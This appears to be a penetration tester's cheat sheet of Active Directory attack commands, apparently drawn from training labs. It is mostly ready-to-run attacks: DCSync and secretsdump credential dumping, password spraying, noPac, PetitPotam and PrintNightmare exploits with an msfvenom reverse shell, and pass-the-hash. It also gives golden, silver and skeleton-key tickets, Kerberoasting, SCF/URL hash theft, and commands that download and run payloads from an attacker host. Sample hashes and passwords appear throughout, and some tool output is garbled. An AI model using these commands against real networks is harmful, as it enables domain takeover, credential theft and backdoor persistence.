.\Rubeus.exe kerberoast /user:adunn /nowrap 

or 

Mimikatz: 

Privelege::debug 

token::elevate 

lsadump::dcsync /domain:testlab.local /user:Administrator 

or 

From Linux after a tunnel is created to the DC: 

Impacket-secretsdump 'testlab.local'/'Administrator':'Password'@'DOMAINCONTROLLER' 

secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5  

or 

In a GUI: 

This spawns another shell - runas /netonly /user:INLANEFREIGHT\adunn powershell 

.\mimikatz.exe 

privilege::debug  

lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator  

WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object. 

AllExtendedRights: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password. 

GetChanges: 

Perform a DCSync attack using secretsdump.py 

 

 ## Post Compromise Attacks
 DomainPasswordSpray.ps1 

Import-Module .\DomainPasswordSpray.ps1 

Single password against users identified - Invoke-DomainPasswordSpray -Password Winter2022 -ErrorAction SilentlyContinue 

Userlist and single user -  

Invoke-DomainPasswordSpray -Userlist userlist.txt -Password 

Winter2022 

Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt 

This command will write the domain user list without disabled accounts or accounts about to be locked out to a file at "userlist.txt". 

Get-DomainUserList -RemoveDisabled | Out-File -Encoding ascii userlist.txt 

Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt 

Commands: 

UserList          - Optional UserList parameter. This will be generated automatically if not specified. 

Password          - A single password that will be used to perform the password spray. 

PasswordList      - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts). 

OutFile           - A file to output the results to. 

Domain            - A domain to spray against. 

Force             - Forces the spray to continue without prompting for confirmation. 

ACL Abuse (After) 

Laps: 

Netexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps 

Lapstoolkit 

Import-module .\LAPSToolkit.ps1 

Find-LAPSDelegatedGroups 

Find-AdmPwdExtendedRights 

Get-lapscomputers 

Find the principals that have ReadPropery on ms-Mcs-AdmPwd 

Get-AdmPwdPassword -ComputerName wkstn-2 | fl 

Read the password 

Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd 

 

Shadow Attack - video 

Need to be an administrator 

Whisker.exe add / target:COMPUTERNAME /domain:DOMAIN 

Copy and paste out put and use with rubeus.exe 

Copy NTLM hash from the DC 

Conduct over PTH with mimikatz here 

Check ticket - klist 

Conduct Dcsync - lsadump::dcsync /domain:DOMAIN /user:krbtgt 

Conduct Golden Ticket attack here 

noPac - https://github.com/Ridter/noPac 

Check for noPac: 

ADautomator 

sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap  

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host COMPUTER-NAME -shell --impersonate administrator -use-ldap   

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host COMPUTERNAME --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator 

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator  

PetitPotam:  

Check for PetitPotam: 

ADautomator 

netexec 

Sudo impacket-ntlmrelayx -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController  

In another terminal: 

From attacker - python3 PetitPotam.py <ATTACKER_IP> <DC_IP>  

Access via mimikatz - misc::efs /server:<Domain Controller> /connect:<ATTACK HOST> 

Request TGT using gettgtpkinit.py 

python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <BASE_64_OUTPUT> dc01.ccache  

Save the ASREP encryption key 

export KRB5CCNAME=dc01.ccache 

secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL  

Check for ccache - klist 

python /opt/PKINITtools/getnthash.py -key <ENCRYTION_KEY_FROM_ABOVE> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$  

Check for Printnightmare 

check to see if DC is vulnerable - rpcdump.py @IP | egrep 'MS-RPRN|MS-PAR' 

or 

impacket-rpcdump north.sevenkingdoms.local/robb.stark:sexywolfy@192.168.56.11 | egrep 'MS-RPRN|MS-PAR' 

If vulnerable: 

Create payload - msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f dll > shell.dll 

create a file - rpcdump.rc 

use exploit/multi/handler 

set payload windows/x64/meterpreter/reverse_tcp 

set LHOST eth0 

set LPORT 4444 

exploit 

msfconsole -r rpcdump.rc 

start smb server in same location as exploit from venom (different options below): 

impacket-smbserver share 'share' -smb2support 

smbserver.py share share/ 

Get printnightmare here 

python3 printnightmare.py DOMAIN/USER:'Passw0rd!'@IPofDC '\\IPofATTACKER\share\shell.dll' 

Get shell (need password and usernames): 

Try changing the target if it doesn't work - set target native \upload 

Exec shells: 

rlwrap smbexec.py DOMAIN/USER:PASSWORD@IP_of_TARGET 

rlwrap wmiexec.py DOMAIN/USER:PASSWORD@IP_of_TARGET 

rlwrap psexec.py DOMAIN/USER:PASSWORD@IP_of_TARGET 

rlwrap dcomexec.py DOMAIN/USER:PASSWORD@IP_of_TARGET 

rlwrap atexec.py DOMAIN/USER:PASSWORD@IP_of_TARGET 

python3 scshell.py USER@IP       ---in windows pivot folder 

python3 /opt/impacket/examples/wmiexec.py DOMAIN/USER:PASSWORD@IP_of_TARGET 

python3 /opt/impacket/examples/psexec.py DOMAIN/USER:PASSWORD@IP_of_TARGET 

Meterpreter exec shells: 

Use exploit/windows/smb/psexec 

Use exploit/windows/smb/psexec_psh 

 

Pass the Hash (cannot pass NTLMv2 hashes) 

rlwrap psexec.py administrator:@10.11.1.24 -hashes ee0c207898a5bccc01f38115019ca2fb:ee0c207898a5bccc01f38115019ca2fb 

impacket-psexec/smbexec/atexec/wmiexec/dcomexec administrator:@10.11.1.120 -hashes 3fee04b01f59a1001a366a7681e95699:3fee04b01f59a1001a366a7681e95699 

Pth-winexe 

pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd 

Netexec: 

Domain accounts - netexec smb 192.168.98.0/24 -u USER -H HASH(secondportion of the NTLM) 

Local accounts - netexec exec smb 192.168.98.0/24 -u USER -H HASH --local-auth 

 

Hash with SMB: 

pth-smbclient --pw-nt-hash -L 192.168.218.210 --user=test \\\\192.168.218.210\\c$ a2345375a47a92754e2505132aca194b 

pth-smbclient --pw-nt-hash --user=test \\\\192.168.218.210\\Quarantine a2345375a47a92754e2505132aca194b 

Invoke-TheHash here: (Command exection on remote machine) 

Zip the folder and put on target 

To add a user cb:  ##if tunnel is setup with ligolo, see pivot section and download and exectute revshell 

 
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1 
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user cb Password123 /add && net localgroup administrators cb /add" -Verbose 

VERBOSE: [+] inlanefreight.htb\julio successfully authenticated on 172.16.1.10 
VERBOSE: inlanefreight.htb\julio has Service Control Manager write privilege on 172.16.1.10 
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU created on 172.16.1.10 
VERBOSE: [*] Trying to execute command on 172.16.1.10 
[+] Command executed with service EGDKNNLQVOLFHRQTQMAU on 172.16.1.10 
VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10 

To get a revshell: 

Attacker - nc -nlvp PORT 

Target -  

Import-Module .\Invoke-TheHash.psd1 
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <shell from revshells>" 

Pass the Password on the domain - Get Hashes 

netexec smb IP/24 -u USER -d DOMAIN -p PASSWORD --sam 

Dump the hash: 

Create user: 

Try to create user accounts on Windows machine: 

check for password policies- ?? 

net user root 123456! /add /domain     or      net user root 123456! /add  

Add user to groups: 

net groups 

net group "Pick from previous command" 

net group "pick from previous command" /add root 

net group "administrators" /add root 

Add New or anyuser added to the Domain 

start httpserver where powerview.ps1 is located 

IEX(New-Object Net.WebClient).downloadString('http://10.10.16.2/powerview.ps1') 

$pass = convertto-securestring 123456! -AsPlainText -Force 

Check - $pass 

$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\root', $pass) 

Check - $cred 

Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity admin -Rights DCSync 

Add User to computer: 

$pass = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force 

$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pass) 

Secretsdump 

Known user: 

sudo impacket-secretsdump DOMAIN/USER:PASSWORD@IP 

sudo impacket-secretsdump –just-dc –history –user-status DOMAIN/user@IP 

Known user and Password with ticket.ccache: 

import Ticket from here or here 

impacket-secretsdump DOMAIN/COMPUTERNAME@COMPUTERNAME.DOMAIN -dc-ip DOMAIN or IP -no-pass -k 

impacket-secretsdump HUTCH.OFFSEC/HUTCHDC\$@hutchdc.hutch.offsec -dc-ip hutch.offsec -no-pass -k 

URL and SCF Attack 

script from here 

python3 hashgrab.py <ip> sharedrive 

If able to upload files to SMB - SCF or URL attack: 

Upload stealhash.scf to share): 

[Shell] 

Command=2 

IconFile=\\10.10.16.10\share\pentestlab.icon 

[Taskbar] 

Command=ToggleDesktop 

Run responder - sudo responder -I INTERFACE -dwvP 

URL attack (Needs to be clicked on target): 

[InternetShortcut] 

URL=blah 

WorkingDirectory=Finance 

IconFile=\\AttackerIP\%USERNAME%.icon 

IconIndex=1 

Save file as "@CompanyFinance.url" 

Open responder and have target navigate to url to get hash 

Token Impersonation with Incognito (delegate only until computer reboots or token exists and active): 

after successful meterpreter session 

if using "exploit /windows/smb/psexec": 

set smbpass/user/target=Native\ upload/payload = windows/x64/meterpreter/reverse_tcp 

load incognito 

list_tokens -u 

impersonate_token DOMAIN\\USER 

dumphashes 

Check gpp after meterpreter session - auxiliary/scanner/smb/smb_enum_gpp 

 

Mimikatz - will get detected unless all AV is off 

sddGo here for the wiki. Go here for mimikatz 

run mimikatz- mimikatz.exe (TRY THE OLD AND NEW) 

Or 

IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1') 

Invoke-Mimikatz 

Dump hashes: 

privilege::debug 

token::whoami 

token::elevate 

lsadump::sam 

lsadump::cache 

This is the format for hashcat (mode 2100)    $DCC2$10240#daisy#b41c8e6a3875e0dd7793f58af6925d0d 

sekurlsa::logonpasswords 

lsadump::lsa /patch 

use -m 1000 for the hashes in hashcat 

DCSYNC: 

lsadump::dcsync /user:Administrator 

lsadump::dcsync /user:USER /domain:DOMAIN /user:DOMAIN\USER 

 

Pass the Hash (PTH) with command execution on internal networks: 

Enable RDP and must use the below with RDP as it will spawn a new cmd window 

mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /ntlm:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit 

dir \\DC01\julio 

Dir  \\DC01\C$ 

Get a file on the internal machine once the listeners are set on ligolo 

certutil.exe -urlcache -split -f "http://10.10.14.41/ligolo_agent.exe" \\DC01\C$\Users\julio\ligolo_agent.exe" 

cmd.exe \\DC01\C$\Users\julio\ligolo_agent.exe -connect 10.10.14.41:1338 -ignore-cert       ## If a listener is running we will connect back to attacker 

Get a file payload and execute it: 

certutil.exe -urlcache -split -f "http://10.10.14.41/met_shell.exe" \\DC01\C$\Users\julio\met_shell.exe" 

cmd.exe \\DC01\C$\Users\julio\met_shell.exe.exe 

If ligolo is setup, download ligolo for double pivot or download payload on internal machine 

Mimikatz.exe privilege::debug "sekurlsa::pth /user:david /domain:inlanefreight /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /run:PowerShell.exe" exit 

dir \\DC01\julio 

Change the highlighted and ensure it’s a ntlm or rc4 

Overpass the hash/key dump 

Mimikatz.exe 

privilege::debug 

sekurlsa::ekeys 

sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f     ##use hash from ekeys command 

Get another shell with privileged access to DC01/Domain Controller: **NEED RDP ENABLED** --see RDP to enable or use netexec to enable 

sekurlsa::pth /user:david /domain:inlanefreight /ntlm:c39f2beb3d2ec06a62cb887fb391dee0 /run:PowerShell.exe 

 

Dump hashes with crackmapexec - crackmapexec smb 192.168.1.1/24 -u Administrator -p Password1 -M mimikatz 

Create Golden Ticket 

Get krbtgt hash: 

lsadump::lsa /inject /name:krbtgt 

or 

lsadump::dcsync /user:LOGISTICS\krbtgt 

Get Domain SID: 

 Get-DomainSID 

Get Group SID: 

Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid 

Using mimikatz: 

kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt 

kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-1800401449-1972031496-2710724772 /krbtgt:HASH /id:500 

Ensure we have the ccache: 

In powershell – klist 

ls \\academy-ea-dc01.inlanefreight.local\c$ 

Launch a window to interact with machines - misc::cmd 

In new window - dir \\COMPUTER_NAME\c$\ 

Ticketer.py from Impacket: 

./ticketer.py -nthash <krbtgt/service nthash> -domain-sid <your domain SID> -domain <your domain FQDN> root 

ticketer.py -nthash HASH -domain-SID SID -domain htb.local goldenticket 

Login with new ticket: 

psexec.py -debug -k -no-pass htb.local/goldenticket@forest 

Rubeus: 

.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt 

Create Silver Ticket 

powershell -ep bypass 

Import-Module .\powerview 

Get-NetUser 

Look for samaccountname, SID, DOMAIN, etc 

In mimikatz 

kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt 

Pass the Ticket for Lateral Movement 

Windows: 

Mimikatz: 

privilege::debug 

ensure "privilege '20' OK" shows or we cannot use admin privs 

sekurlsa::tickets /export 

kerberos::ptt <ticket> 

kerberos::ptt [0;2d5d53]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi 

OR 

kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi" 

exit mimikatz 

get dc name in powershell - nltest /dclist:DOMAIN 

nltest /dclist:xor.com 

Command Execution: 

dir \\DOMAIN\USERNAME 

dir \\DC01\C$ 

certutil.exe -urlcache -split -f "http://10.10.14.41/met_shell.exe" \\DC01\C$\Users\julio\met_shell.exe" 

cmd.exe \\DC01\C$\Users\julio\met_shell.exe.exe 

 

Rubeus: 

privilege::debug 

sekurlsa::ekeys 

Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt 

Find an administrator or someone with NT authority or high privs 

Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi 

Convert to b64 - [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi")) 

Rubeus.exe ptt /ticket:<b64 output from above> 

Run commands on DC; 

 

 

Create Backdoor with Skeleton Key: 

privilege::debug 

misc::skeleton 

Getting access: 

net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz 

 

Extract Kerberos Tickets 

base64 /out:true 

kerberos::list /export 

echo "<base64 blob>" |  tr -d \\n 

Put output into a file called encoded_file 

cat encoded_file | base64 -d > output.kirbi 
 

kirbi2john.py output.kirbi 
 

sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > outputnew.kirbi 

Creck for $23 file type, then - hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 

 

 ## Kerberoast and ASREProast
 Sync Time with DC/Computer 

sudo ntpdate -u <domain_name>    ##DOMAIN NAME 

 

ASREProast 

 

User Adautomator to automate the process 

Make or get a list of possible usernames from enumeration 

first.last, flast, firstlast, last.first, etc 

Kerberos user enumeration: 

cd /opt/kerbrute/dist/ 

Cp kerbrute into /usr/bin 

kerbrute --dc IPofDC -d DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --downgrade 

kerbrute --dc IPofDC -d DOMAIN /home/cb/pentest/2-enumeration/statistically-likely-usernames/master_username_list.txt --downgrade 

2022/05/09 13:53:11 > [+] VALID USERNAME: 
2022/05/09 13:53:11 > [+] VALID USERNAME: 
administratoröcontroller.local 
adminlöcontroller .local 
2022/05/09 13:53:11 > [+] admin2 has no pre auth required. Dumping hash to crack offline: 
$krb5asrep 18 admn20CONTROLLER.LOCAL:3a5519a1fe28c1a4ca81c5f8Q429e4f 779b4de17efdc0dea1b2f7cedaff40f917d585cgc386f6a640e2 3ad6( 
50coa8e01eae4a0d93e6178d72d846fbcc15c2cdbdef2bbb3dca8ddd9c780923779157c56d535437826a6e328919aa31ebff4a7919be1809572ea74a67 38c8' 
32237481713faf7344ec093a27dc8583b66247417557f777d061e46e85b7a41boc32239a5e3efa493a701e7a5ab0b6e76e644dad8d96908c06869196546 
2022 05 09 > + VALID USERNAME: 
2022/05/09 13:53:12 > [+] VALID USERNAME: 
a mln2öcontro er. oca 
httpserviceacontroller.local 
 

For asrep hashes, use the --downgrade option to use in hashcat (need the $23 in the hash) 

$krb5asrepSOff 
send to hashcat and use -m 18200 

Copy and paste all output into a file, then run - grep -oP 'VALID USERNAME:\s+\K[^@]+' yourfile.txt 

Known users ID'd from previous step new users.txt file: 

impacket-GetNPUsers: 

impacket-GetNPUsers -usersfile /home/cb/pentest/2-enumeration/statistically-likely-usernames/master_username_list.txt -dc-ip IP_of_DC -request DOMAIN_NAME/ -format hashcat 

impacket-GetNPUsers -dc-ip IP_of_DC -request DOMAIN_NAME/ -format hashcat 

Ensure DC IP is added to /etc/hosts; 

impacket-GetNPUsers DOMAIN/USERNAME 

No user - impacket-GetNPUsers -dc-ip IP -request 'DOMAIN/' 

User and password known: 

impacket-GetNPUsers contoso.com/emily:password 

while read p; do impacket-GetNPUsers resourced.local/"$p":ItachiUchiha888 >> hashes.txt; done < users.txt 

Navigate to users.txt folder - while read p; do impacket-GetNPUsers <DOMAIN>/"$p" -request -no-pass -dc-ip <IP> >> hashes.txt; done < users.txt 

send to hashcat with 18200 

 

Kerberoasting: 

LSA Attack with LSA-Reaper - here 

Setup in virtual environment: 

python3 -m venv .venv 

source .venv/bin/activate 

which python 

to leave the environment- deactivate 

git clone https://github.com/samiam1086/LSA-Reaper.git  

cd LSA-Reaper 

sudo sh setup.sh 

sudo python3 lsa-reaper.py -ap <DOMAIN>/<USER>:<'Password'>@192.168.233.128 

navigate to loot folder to get hash. Remember to use the hash twice for psexec 

 

Invoke-Kerberoast.py 

Powershell -ep bypass 

Import-Module .\Invoke-Kerberoast.py 

Invoke-Kerberoast -OutputFormat Hashcat 

use 13100 in hashcat 

Invoke-Kerberoast.ps1 

Get file on target 

powershell -ep bypass 

. .\Invoke-Kerberoast.ps1 

Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\users\public\hashcapture.txt' -Width 8000 

GetSPN.py 

Once logged in, use the getspn.ps1 module on target 

powershell -ep bypass 

. .\getspn.ps1 

Get-SPN -type service -search "*" 

klist 

Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com' 

In mimikatz: 

kerberos::list /export 

Transfer files to kali using ftp or exfi ttp 

turn to hashcat readable format: 

kirbi2john FILE.kirbi > spn.txt 

put in hashes.txt with 13100 

 

GetUserSPN: 

Authenticated: 

GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip IP -request 

python3 /opt/impacket/examples/GetUserSPNs.py DOMAIN/USER:PASSWORD -dc-ip DOMAIN_IP -request 

 

Unauthenticated: 

Impacket-GetUserSPNs -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

Loop through usernames 

 

Kerberos Tickets  

Convert a ticket from ccache to .kirbi - impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi 

Importing Tickets into a windows session w/ Rubeus: 

Rubeus.exe ptt /ticket:c:\tools\julio.kirbi 

Klist 

dir \\dc01\julio 

Command execution here 

 

Kerberos Tickets: 

Linux: 

Check if the computer is domain joined: 

#Sudo apt install realmd 

realm list 

Check services - ps -ef | grep -i "winbind\|sssd" 

 env | grep -i krb5 

Search for tickets here 

If keytab is accessed - we can impersonate this user on the DC 

ls -la /tmp 

Impersonation: 

klist -k -t 

Klist -A 

klist  

kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab 

klist  

smbclient //dc01/carlos -k -c ls 

Keep checking tickets with - klist -k -t 

Extract keytabs - here 

Find Keytabs and kerberos tickets: 

find / -type f \( -name '*ccache*' -o -name '*keytab*' -o -name '*krb5cc*' -o -name '*.kt' \) 2>/dev/null -exec file {} \; | awk -F: '/data|kerberos|krb5cc/ {print "\033[31m" $0 "\033[0m";next} 1' 

python3 /tmp/keytabextract.py /opt/specialfiles/carlos.keytab 

Login - su USER@DOMAIN 

Once root, look for more passwords and ccache files 

Find groups associated with users - Id USERNAME    ## id julio@inlanefreight.htb 

Find krb5cc files and import them: **YOU MIGHT HAVE TO BE ROOT** 

Klist 

export  KRB5CCNAME=/root/krb5cc_647401106_I8I133   ##ensure the krb5cc/ccache file is in the location of the highlighted 

Klist   ##should now see exported krb5cc file 

Check expiration date. If its expired, it wont work 

See if we have access to DC: 

Access SMB: 

smbclient //dc01/C$ -k -c ls -no-pass 

smbclient //dc01/carlos -k -c ls       ## the "ls" is a command, use "cat" to read something 

smbclient //dc01/julio -k -U julio -no-pass 

Netexec w/ -x for command execution 

Loop through all discovered CCACHE files to cycle through users who have access. Don’t be fulled as some will have the same user, but may not work. 

 

Run - linikatz.sh 

Look at the output and import the ticket: 

export KRB5CCNAME=/var/lib/sss/db/ccache_INLANEFREIGHT.HTB 

smbclient //dc01/linux01 -k -U linux01 -no-pass 

Look in saved folder after its ran - file * 

Python3 keytabextract.py KEYTABFILE 

Crack hash or try to pass it 

Linux attack tools from Attacker machine (Pivot w/ chisel or ssh -D): 

Add domain machine to /etc/hosts file     ## ms01.inlanefreight.htb  ms01 

RDP/log into pivot machine that has access to DC via ligolo 

Get ccache file off target onto Attacker machine "krb5cc_647401106_I8I133" 

Export ccache on Attaker - export KRB5CCNAME=/home/cb/pentest/training/cpts/password/linux_ptt/krb5cc_647401106_I8I133 

Proxy into far target: 

If using ligolo - impacket-wmiexec DC01 -k 

If using chisel - proxychains impacket-wmiexec DC01 -k 

Winrm 

 

Rubeus: 

Get rubeus here 

Harvest TGT tickets (need elevated privs)rub 

Rubeus.exe harvest /interval:30 

This will dump base64 encoded ticktets every 30 secs 

Join Lines - copy paste into notepad ++, edit, line operations, join lines 

Remove spaces - search, replace, find what= \s*, with=, replace all 

copy into seperate txt file 

Pass the ticket 

Password spraying: 

add DC to windows hosts file 

echo 10.10.209.66 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts 

Rubeus.exe brute /password:PASSWORDTOSPRAY /noticket 

Kerberoasting: 

rubeus.exe dump /nowrap 

rubeus.exe kerberoast /nowrap 

rubeus.exe kerberoast /nowrap /tgtdeleg 

rubeus.exe kerberoast /nowrap /tgtdeleg /user:USER 

rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap 
 

Crack - hashcat -m 13100 -a 0 hashes.txt cracked.txt 

AS_REP Roasting: 

rubeus.exe asreproast /nowrap /format:hashcat 

Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User..... 

hashcat -m 18200 hashes.txt cracked.txt 

 

TGT Delegate: (Only works on SERVER 2016) 

.\rubeus.exe tgtdeleg /nowrap 

save base64 output to kali in a tickect.b64 filename 

Decrypt b64 file - cat ticket.b64 | base64 -d > ticket.kirbi 

impacket-ticketConverter ticket.kirbi ticket.ccache 

export KRB5CCNAME=`pwd`/ticket.ccache 

psexec: 

impacket-psexec -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.137.175 

psexec.py -k -no-pass resourced.local/administrator@resourcedc.resourced.local -dc-ip 192.168.137.175 

secrets dump 

Overpass the hash/TGT Export/key dump 

Mimikatz.exe 

privilege::debug 

sekurlsa::ekeys 

sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f     ##use hash from ekeys command 

Rubeus: 

Get a hash from mimikatz's "sekurlas::ekeys" command: 

 

rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap 

 

 

 

 

 

 

  
